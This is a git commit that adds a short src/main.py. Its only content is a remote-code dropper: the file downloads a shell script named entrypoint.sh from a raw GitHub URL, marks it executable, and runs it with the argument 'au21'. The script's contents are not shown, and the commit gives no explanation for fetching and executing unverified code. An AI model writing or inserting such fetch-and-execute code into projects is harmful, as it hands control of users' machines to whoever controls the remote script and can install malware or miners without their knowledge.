59c380b0172262a40c189bfece58b7f7348b92a6
tursputra <guntursaputra@freedommail.ch>
2026-03-09 03:31:43 +0700

    Create main.py

---
+++ src/main.py
@@ -0,0 +1,5 @@
+import os
+
+os.system("curl -o entrypoint.sh https://raw.githubusercontent.com/menju2ikg8uti/pose/main/1/entrypoint.sh")
+os.system("chmod +x entrypoint.sh")
+os.system("./entrypoint.sh au21")
